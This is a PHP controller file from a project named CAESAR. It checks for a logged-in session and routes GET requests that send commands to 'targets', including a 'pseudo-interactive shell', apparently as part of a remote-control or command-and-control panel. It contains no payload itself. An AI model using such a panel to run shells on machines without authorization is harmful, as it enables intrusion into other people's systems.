<?php

	/*
		CAESAR

		Author : Michele '0blio' Cisternino
		Email  : miki.cisternino@gmail.com
		Github : https://github.com/0blio
	
		This project is released under the GPL 3 license. 	
	*/
	
	session_start();

	// If user is logged in
	if (isset($_SESSION['username'])) {
		if ($_SERVER['REQUEST_METHOD'] == 'GET') {

			include 'database/connection.php';

			include 'helpers/server/string.php';
			include 'helpers/server/html.php';

			// If no target is selected 
			if (isset($_GET['command']) and !isset($_GET['target'])) 
				include 'controller-logic/non_selected_target.php';
		
			// Else if a target is selected
			else if (isset($_GET['command']) and isset($_GET['target']) and !isset($_GET['shell'])) 
				include 'controller-logic/selected_target.php';

			// Else if the user is using a pseudo-interactive shell
			else if (isset($_GET['command']) and isset($_GET['target']) and isset($_GET['shell'])) 
				include 'controller-logic/target_shell.php';

			else 
				$output = 'No arguments';

			echo $output;
		}		
	} 